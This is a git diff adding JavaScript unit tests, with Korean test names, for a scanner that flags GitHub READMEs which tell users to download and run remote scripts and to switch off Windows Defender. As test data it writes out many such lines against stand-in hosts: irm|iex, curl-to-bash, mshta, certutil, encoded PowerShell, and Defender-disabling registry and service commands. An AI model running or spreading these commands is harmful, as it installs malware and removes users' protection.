@@ -209,6 +209,314 @@ test('512KB 상한 크기의 반복 토큰 입력도 선형 시간에 판정한�
   }
 });
 
+const EXEC = 'irm https://x.example/a.ps1 | iex';
+const OFF = 'If the setup gets blocked, pause "Real-time protection" in Windows Security.';
+const encoded = (script) => Buffer.from(script, 'utf16le').toString('base64');
+const CODELESS = { language: null, forks: 0, size: 3 };
+
+test('저장 후 실행: 받은 파일을 같은 명령이나 같은 코드블록의 다음 3줄 안에서 실행하면 실행 지시다', () => {
+  for (const command of [
+    // 2026-11-09 조사에서 군집이 실행 정책 우회용으로 안내한 형태.
+    'curl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1',
+    'curl -fsSLo setup.sh https://x.example/setup.sh; sudo bash setup.sh',
+    'iwr https://x.example/a.ps1 -OutFile $env:TEMP\\a.ps1; & $env:TEMP\\a.ps1',
+    '```\nwget https://x.example/tool/install.sh\nchmod +x install.sh\n./install.sh\n```',
+    '```\ncertutil -urlcache -split -f https://x.example/s.exe s.exe\nstart s.exe\n```',
+    "(New-Object Net.WebClient).DownloadFile('https://x.example/u.exe','u.exe'); Start-Process u.exe",
+  ]) {
+    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
+    assert.equal(classifyReadme(command).verdict, 'clean', `${command} (실행 지시만)`);
+  }
+});
+
+test('저장만 하거나, 다른 파일을 실행하거나, 실행이 4줄 이상 떨어지거나 다른 코드블록이면 실행 지시가 아니다', () => {
+  for (const command of [
+    'curl -o notes.txt https://x.example/notes.txt && cat notes.txt',
+    'curl -o a.sh https://x.example/a.sh && bash b.sh',
+    '```\ncurl -o a.sh https://x.example/a.sh\necho 1\necho 2\necho 3\nbash a.sh\n```',
+    '```\ncurl -o a.sh https://x.example/a.sh\n```\nThen review the script.\n```\nbash a.sh\n```',
+    'curl -o a.sh ./local/a.sh && bash a.sh',
+  ]) {
+    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'clean', command);
+  }
+});
+
+test('치환·scriptblock·mshta로 받은 내용을 바로 실행하면 실행 지시다', () => {
+  for (const command of [
+    'bash <(curl -s https://x.example/i.sh)',
+    'sh -c "$(curl -fsSL https://x.example/i.sh)"',
+    '& ([scriptblock]::Create((irm https://x.example/a.ps1)))',
+    'iex "& { $(irm https://x.example/a.ps1) }"',
+    'mshta https://x.example/a.hta',
+  ]) {
+    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
+    assert.equal(classifyReadme(command).verdict, 'clean', `${command} (실행 지시만)`);
+  }
+  assert.equal(classifyReadme(`bash <(cat ./local.sh)\n${OFF}`).verdict, 'clean');
+});
+
+test('인코딩 명령은 풀린 본문에 신호가 있을 때만 인정한다', () => {
+  const both = encoded('Set-MpPreference -DisableRealtimeMonitoring $true; irm https://x.example/a.ps1 | iex');
+  const result = classifyReadme(`powershell -NoP -W Hidden -enc ${both}`);
+  assert.equal(result.verdict, 'malicious');
+  assert.match(result.evidence, /irm https:\/\/x\.example\/a\.ps1 \| iex/);
+  assert.equal(classifyReadme(`pwsh -EncodedCommand ${encoded(EXEC)}\n${OFF}`).verdict, 'malicious');
+  assert.equal(classifyReadme(`pwsh -EncodedCommand ${encoded(EXEC)}`).verdict, 'clean');
+  assert.equal(classifyReadme(`powershell -enc ${encoded('Write-Host "setup finished successfully"')}\n${OFF}`).verdict, 'clean');
+  assert.equal(classifyReadme(`powershell -enc ${Buffer.from('\u0001\u0002\u0003\u0004'.repeat(20), 'latin1').toString('base64')}\n${OFF}`).verdict, 'clean');
+  assert.equal(classifyReadme(`powershell -enc not-base64-at-all!!\n${OFF}`).verdict, 'clean');
+});
+
+test('Defender를 끄는 명령은 보호 해제 안내이고, 값을 0으로 쓰거나 부정문이면 아니다', () => {
+  for (const off of [
+    'sc stop WinDefend',
+    'Stop-Service -Name WinDefend -Force',
+    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
+    'Set-MpPreference -DisableRealtimeMonitoring 1',
+  ]) {
+    assert.equal(classifyReadme(`${EXEC}\n${off}`).verdict, 'malicious', off);
+    assert.equal(classifyReadme(off).verdict, 'clean', `${off} (보호 해제만)`);
+  }
+  assert.equal(classifyReadme(`${EXEC}\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f`).verdict, 'clean');
+  assert.equal(classifyReadme(`${EXEC}\nDo not run sc stop WinDefend.`).verdict, 'clean');
+});
+
+test('보호 대상을 일반 명사로 쓴 문구는 코드 없는 저장소 메타가 있을 때만 보호 해제 안내다', () => {
+  const FENCED = `\`\`\`\n${EXEC}\n\`\`\`\n`;
+  for (const off of [
+    'Temporarily disable your security software before running.',
+    'Turn off your firewall first.',
+  ]) {
+    const text = `${FENCED}${off}`;
+    assert.equal(classifyReadme(text, CODELESS).verdict, 'malicious', off);
+    assert.equal(classifyReadme(text).verdict, 'clean', `${off} (메타 없음)`);
+    assert.equal(classifyReadme(text, { ...CODELESS, language: 'Python' }).verdict, 'clean', `${off} (language 있음)`);
+    assert.equal(classifyReadme(text, { ...CODELESS, forks: 2 }).verdict, 'clean', `${off} (forks 있음)`);
+    assert.equal(classifyReadme(text, { ...CODELESS, size: 5000 }).verdict, 'clean', `${off} (큰 저장소)`);
+    assert.equal(classifyReadme(text, { language: null, forks: 0 }).verdict, 'clean', `${off} (size 없음)`);
+    assert.equal(classifyReadme(text, { language: null, forks: false, size: 3 }).verdict, 'clean', `${off} (forks가 숫자가 아님)`);
+    assert.equal(classifyReadme(text, { language: null, forks: 0, size: '3' }).verdict, 'clean', `${off} (size가 숫자가 아님)`);
+    assert.equal(classifyReadme(off, CODELESS).verdict, 'clean', `${off} (보호 해제만)`);
+  }
+  // 코드 없는 저장소라는 사실만으로는 숨기지 않는다(D-010).
+  assert.equal(classifyReadme(EXEC, CODELESS).verdict, 'clean');
+  assert.equal(classifyReadme(`${FENCED}Do not disable your security software.`, CODELESS).verdict, 'clean');
+  // 일반 명사 문구는 문장 어디에든 부정·금지·조건 표현이나 부속 대상이 있거나, 끄라는 말로 시작하는 문장이 아니면 지시로 보지 않는다.
+  for (const guidance of [
+    'It is unnecessary to disable the firewall.',
+    'Do not, under any circumstances, disable your security software.',
+    "You don't have to turn off your firewall.",
+    'You can disable the firewall.',
+    'If it fails, disable the firewall.',
+    'Some users disable the firewall.',
+    'The property is named Disable firewall, and its value defaults to false.',
+    'The audit log records attempts to disable security software.',
+    'Disable firewall and security software notifications only.',
+    'Disable firewall and branch protection simulations in the test harness.',
+  ]) {
+    assert.equal(classifyReadme(`${FENCED}${guidance}`, CODELESS).verdict, 'clean', guidance);
+  }
+  for (const off of ['1. Please disable the firewall.', 'First, turn off your firewall.', 'You must disable your security software to continue.']) {
+    assert.equal(classifyReadme(`${FENCED}${off}`, CODELESS).verdict, 'malicious', off);
+  }
+  // 방화벽·보호라는 낱말이 다른 대상을 가리키거나 상태를 설명하는 문장은 지시가 아니다.
+  const fenced = `\`\`\`\n${EXEC}\n\`\`\`\n`;
+  for (const guidance of [
+    'Turn off branch protection before force pushing.',
+    'Turn off the firewall rule for port 8080 after testing.',
+    'Disable the firewall logging verbosity if the output is noisy.',
+    'Stop the firewall service container with `docker compose down` when done.',
+    'If the firewall is off, the health check prints a warning.',
+    'Turn off AV sync in the audio/video settings if playback stutters.',
+    'Disable all protection rules on the test branch, then re-enable them.',
+    'Protection should be disabled before setup.',
+    'Your protection is paused until the license is renewed.',
+  ]) {
+    assert.equal(classifyReadme(`${fenced}${guidance}`, CODELESS).verdict, 'clean', guidance);
+  }
+});
+
+test('스캐너는 저장소 메타를 판정에 넘긴다', async () => {
+  const readme = `\`\`\`\n${EXEC}\n\`\`\`\nTemporarily disable your security software before running.`;
+  const { instance, saved } = scanner({ readmes: { 'o/shell': readme, 'o/lib': readme } });
+  await instance.scanRepos({}, [
+    { github_id: 1, owner: 'o', name: 'shell', pushed_at: PUSHED, ...CODELESS },
+    { github_id: 2, owner: 'o', name: 'lib', pushed_at: PUSHED, language: 'Go', forks: 0, size: 3 },
+  ]);
+  assert.deepEqual(saved.map((row) => [row.github_id, row.verdict]).sort(), [[1, 'malicious'], [2, 'clean']]);
+});
+
+test('인코딩 인자는 풀리지 않는 것까지 합쳐 20개까지만 본다', () => {
+  const garbage = 'powershell -enc AAAAAAAAAAAAAAAA\n';
+  const real = `powershell -enc ${encoded(EXEC)}\n${OFF}`;
+  assert.equal(classifyReadme(`${garbage.repeat(19)}${real}`).verdict, 'malicious');
+  assert.equal(classifyReadme(`${garbage.repeat(20)}${real}`).verdict, 'clean');
+});
+
+test('어순·구분자 변형: 점(.) 치환 실행, cmd의 & 구분자, 프롬프트가 붙은 줄, 긴 명령 묶음', () => {
+  assert.equal(classifyReadme(`. <(curl -fsSL https://x.example/install.sh)\n${OFF}`).verdict, 'malicious');
+  assert.equal(classifyReadme(`See docs. <(not a command)\n${OFF}`).verdict, 'clean');
+  for (const command of [
+    'bitsadmin /transfer n https://dl.example.net/q.bat %TEMP%\\q.bat & cmd /c %TEMP%\\q.bat',
+    'certutil -urlcache -split -f https://dl.example.net/t.exe t.exe & t.exe',
+    'curl -o t.exe https://dl.example.net/t.exe & start t.exe',
+    'curl -o a.sh "https://dl.example.net/get?v=1&os=linux" && bash a.sh',
+    // 저장과 실행 사이에 명령이 많이 끼어도 같은 명령 묶음이면 잇는다.
+    `curl -o own.sh https://dl.example.net/own.sh; ${'echo step; '.repeat(30)}bash own.sh`,
+    'curl -o a.ps1 https://dl.example.net/a.ps1; powershell -ExecutionPolicy Bypass -File a.ps1',
+    'curl -o a.bat https://dl.example.net/a.bat && cmd /c start "" a.bat',
+    '```\n$ curl -o a.sh https://dl.example.net/a.sh\n$ ./a.sh\n```',
+    '```\nPS C:\\> iwr https://dl.example.net/a.ps1 -OutFile a.ps1\nPS C:\\> .\\a.ps1\n```',
+    // 경로가 붙은 실행기, 옵션이 붙은 sudo, 다음 줄의 뒤쪽 구간
+    'curl -o x.sh https://dl.example.net/x.sh; /bin/bash x.sh',
+    'curl -o x.sh https://dl.example.net/x.sh; sudo -u root bash x.sh',
+    'curl -o x.sh https://dl.example.net/x.sh; env DEBUG=1 /usr/bin/env bash x.sh',
+    `\`\`\`\ncurl -o x.sh https://dl.example.net/x.sh\n${'echo step; '.repeat(25)}bash x.sh\n\`\`\``,
+    // 값을 받는 옵션, 공백이 든 실행기 경로, 긴 옵션이 붙은 치환, 따옴표로 묶은 mshta 경로
+    'curl -o x.sh https://dl.example.net/x.sh; sudo --user root bash x.sh',
+    'curl -o x.sh https://dl.example.net/x.sh; /usr/bin/time -f %E bash x.sh',
+    'iwr https://dl.example.net/a.ps1 -OutFile a.ps1; powershell -InputFormat Text -File a.ps1',
+    'iwr https://dl.example.net/a.ps1 -OutFile a.ps1; & "C:\\Program Files\\PowerShell\\7\\pwsh.exe" -File a.ps1',
+    'bash --noprofile --norc <(curl -fsSL https://dl.example.net/i.sh)',
+    '"C:\\Windows\\System32\\mshta.exe" https://dl.example.net/i.hta',
+    '$block = [scriptblock]::Create((irm https://dl.example.net/i.ps1)); & $block',
+    '[scriptblock]::Create((irm https://dl.example.net/i.ps1)).Invoke()',
+    'Invoke-Command -ScriptBlock ([scriptblock]::Create((irm https://dl.example.net/i.ps1)))',
+    '```\n$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1))\n& $b\n```',
+    '```\n$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1))\n$b.Invoke()\n```',
+    // 실행하지 않는 말이 파이프의 첫 단계일 뿐이면 뒤 단계는 실행이다(1판과 같은 판정).
+    'Write-Output ready | irm https://dl.example.net/i.ps1 | iex',
+    'curl -o a.sh https://dl.example.net/a.sh; echo yes | bash a.sh',
+    // 실행기에 넘긴 명령 문자열 안의 저장 후 실행, 호출 연산자 뒤 긴 공백
+    'bash -c "curl -o a.sh https://dl.example.net/a.sh; bash a.sh"',
+    'powershell -Command "iwr https://dl.example.net/a.ps1 -OutFile a.ps1; & .\\a.ps1"',
+    'cmd /c "curl -o a.bat https://dl.example.net/a.bat && a.bat"',
+    `&${' '.repeat(40)}([scriptblock]::Create((irm https://dl.example.net/a.ps1)))`,
+  ]) {
+    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'malicious', command);
+  }
+});
+
+test('받은 파일을 실행하지 않고 읽거나 출력만 하는 명령은 저장 후 실행이 아니다', () => {
+  for (const command of [
+    'curl -o report.json https://events.example.org/report.json; python -m json.tool report.json',
+    'curl -o own.sh https://dl.example.net/own.sh; echo bash own.sh',
+    'curl -o notes.txt https://dl.example.net/notes.txt; powershell -Command Get-Content notes.txt',
+    'curl -o a.sh https://dl.example.net/a.sh; cat a.sh',
+    'curl -o data.csv https://dl.example.net/data.csv && python3 analyze.py data.csv',
+    // 내려받기 명령을 출력만 하고 로컬 파일을 실행
+    'echo curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
+    'printf "curl -o x.sh https://dl.example.net/x.sh\\n"; bash x.sh',
+    'Write-Host iwr https://dl.example.net/x.ps1 -OutFile x.ps1; powershell -File x.ps1',
+    // 내려받기 도구가 다른 명령의 인자, 실행하지 않는 옵션, 다른 파일
+    'true curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
+    'cat curl -o x.sh https://dl.example.net/x.sh; bash x.sh',
+    'curl -o x.sh https://dl.example.net/x.sh; bash -n x.sh',
+    'curl -o x.py https://dl.example.net/x.py; python -V x.py',
+    'curl -o "my script.sh" https://dl.example.net/a.sh; bash "my local.sh"',
+    'curl -fsSL https://dl.example.net/a.sh -o a.sh | bash b.sh',
+    // 출력만 하거나 만들기만 한 실행 형태
+    'echo "bash <(curl -fsSL https://dl.example.net/i.sh)"',
+    'echo "mshta https://dl.example.net/i.hta"',
+    `Write-Host pwsh -enc ${encoded(EXEC)}`,
+    '$block = [scriptblock]::Create((irm https://dl.example.net/i.ps1))',
+    '$b = [scriptblock]::Create((irm https://dl.example.net/i.ps1)); $local.Invoke()',
+    // 따옴표 안의 구분자는 명령을 나누지 않는다.
+    "printf %s 'example && mshta https://dl.example.net/i.hta'",
+    'curl -o a.sh https://dl.example.net/a.sh && cat "notes; bash a.sh"',
+    'curl -o a.sh https://dl.example.net/a.sh | cat "x | bash a.sh"',
+    // 실행하지 않는 옵션은 치환·파이프·인코딩에서도 실행이 아니다.
+    'bash -n <(curl -fsSL https://dl.example.net/i.sh)',
+    'curl -fsSL https://dl.example.net/i.sh | bash -n',
+    "curl -fsSL https://dl.example.net/i.sh | sh -c 'echo done'",
+    `pwsh --help -enc ${encoded(EXEC)}`,
+    'cat \'(New-Object Net.WebClient).DownloadFile("https://dl.example.net/a.ps1","a.ps1")\'; pwsh -File a.ps1',
+  ]) {
+    assert.equal(classifyReadme(`${command}\n${OFF}`).verdict, 'clean', command);
+  }
+});
+
+test('새로 인식하는 설치 명령과 함께 있어도 금지문·부속 대상 안내는 clean이다', () => {
+  const brew = '```\n/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"\n```\n';
+  for (const guidance of [
+    'Do not, under any circumstances, disable Windows Defender.',
+    'Never, ever, turn off real-time protection.',
+    'Disable antivirus update notifications only.',
+    'Turn off Defender scan result pop-ups.',
+  ]) {
+    assert.equal(classifyReadme(`${brew}${guidance}`).verdict, 'clean', guidance);
+    assert.equal(classifyReadme(`${brew}${guidance}`, CODELESS).verdict, 'clean', `${guidance} (코드 없는 저장소)`);
+  }
+  // 1판이 걸러 내던 부정문은 계속 걸러 낸다.
+  assert.equal(classifyReadme(`${brew}The installer cannot automatically permanently disable Windows Defender.`).verdict, 'clean');
+  // 조건절 뒤의 지시는 금지문이 아니다.
+  assert.equal(classifyReadme(`${brew}If the installer doesn't start, disable Windows Defender.`).verdict, 'malicious');
+  assert.equal(classifyReadme(`${brew}If Windows Defender blocks the file, turn off real-time protection.`).verdict, 'malicious');
+  // 금지가 아니라 꼭 하라는 지시(1판과 같은 판정).
+  assert.equal(classifyReadme(`${brew}Never, ever forget to disable Windows Defender before running.`).verdict, 'malicious');
+  assert.equal(classifyReadme(`${brew}Do not, under any circumstances, forget to disable Windows Defender before running.`).verdict, 'malicious');
+});
+
+test('영어가 아닌 문장은 보호 해제 안내로 읽지 않는다(부정·금지 표현을 가려낼 수 없어 2판에서 뺌)', () => {
+  const install = '```\ncurl -fsSL https://get.example.org/i.sh | bash\n```\n';
+  for (const guidance of [
+    '설치 전에 Windows Defender 실시간 보호를 꺼 주세요.', '백신 프로그램을 잠시 비활성화한 뒤 실행하세요.',
+    '运行前请关闭杀毒软件和实时保护。', 'Перед установкой отключите антивирус.',
+    'Desactiva temporalmente el antivirus antes de instalar.', 'Desative o antivírus antes de executar.',
+    '백신을 비활성화하면 안 됩니다.', '백신을 끄기보다는 설치 로그를 먼저 확인하세요.',
+    '禁止关闭杀毒软件。', '不应关闭实时保护。', 'Нельзя отключать антивирус для работы приложения.',
+    'Desactivar el antivirus no es necesario para usar este programa.', 'É proibido desabilitar o antivírus para usar esta ferramenta.',
+    'Desactiva la ventana de Defender al minimizar; la protección sigue activa.',
+    // 부정
+    '백신을 끄면 안 됩니다.', '백신은 안 꺼도 됩니다.', '실시간 보호를 굳이 끄실 필요까지는 전혀 없습니다.',
+    '本项目不会禁用 Defender。', '本工具不会关闭杀毒软件。', '我们没有关闭实时保护。', '无须关闭杀毒软件。', '不建议关闭杀毒软件。',
+    'Отключать антивирус не требуется.', 'Funciona sin desactivar el antivirus.', 'Nunca desactives el antivirus.',
+    'Funciona sem desativar o antivírus.', 'Nunca desative o antivírus.',
+    // 낱말 일부가 겹치거나 다른 대상을 가리킴
+    '백신으로 검사한 뒤 압축을 해제하세요.', '매끄러운 설치를 위해 백신 검사를 통과한 서명 바이너리를 제공합니다.',
+    '부끄럽지만 아직 백신 인증은 받지 못했습니다.', '백신 프로그램이 설치 파일을 꺼림칙하게 여길 수 있습니다.',
+    '코로나 백신 예약 매크로를 중지하려면 Ctrl+C 를 누르세요.',
+    '关闭窗口后杀毒软件会自动扫描下载的文件。', '暂停下载时杀毒软件可能会扫描临时文件',
+    // 알림만 끔
+    '关闭 Defender 的通知即可。', 'Отключите уведомления защитника.', 'Desactiva las notificaciones de Defender.',
+    'Desative as notificações do antivírus.',
+  ]) {
+    assert.equal(classifyReadme(`${install}${guidance}`).verdict, 'clean', guidance);
+    assert.equal(classifyReadme(`${install}${guidance}`, CODELESS).verdict, 'clean', `${guidance} (코드 없는 저장소)`);
+  }
+});
+
+
+test('저장 명령·인코딩 인자가 아주 많이 반복돼도 선형 시간에 판정한다', () => {
+  for (const text of [
+    'curl -o a http://x.yy/z && '.repeat(18_000),
+    `[scriptblock]::create((irm https://e.com/x)) & ${' '.repeat(500_000)}x`,
+    'curl -o a http://x.yy/z\n'.repeat(20_000),
+    Array.from({ length: 15_000 }, (_, i) => `curl -o f${i}.sh http://x.yy/f${i}.sh`).join('\n'),
+    `powershell -enc ${'A'.repeat(480_000)}`,
+    `powershell -enc ${encoded('Write-Host ok ok ok')} `.repeat(8_000),
+    `sh ${'-a '.repeat(150_000)}`,
+    `sh ${'-sh '.repeat(130_000)}`,
+    `wget https://x.io/ ${'ab.'.repeat(170_000)}`,
+    `curl -O https://x.io/ ${'a-b.c.'.repeat(85_000)}`,
+    `certutil https://x.io/ ${'-urlcache-https://'.repeat(29_000)}`,
+    `bitsadmin https://x.io/ ${'/transfer-https://'.repeat(29_000)}`,
+    'a |\n'.repeat(130_000),
+    `x\n${'| y\n'.repeat(130_000)}`,
+    `\`\`\`\nx\n${'| y\n'.repeat(130_000)}\`\`\``,
+    'a\\\n'.repeat(170_000),
+    'a`\n'.repeat(170_000),
+    '关。'.repeat(260_000),
+    '. '.repeat(260_000),
+    `${'끄 '.repeat(100_000)}백신`,
+    `desactiv ${'a '.repeat(200_000)}`,
+  ]) {
+    const started = performance.now();
+    classifyReadme(text, CODELESS);
+    assert.ok(performance.now() - started < 1000, `${text.slice(0, 16)}… took too long`);
+  }
+});
+
 test('저장 실패는 그 저장소에만 머물고 나머지 판정이 모두 끝난 뒤 반환한다', async () => {
   const saved = [];
   const warnings = [];
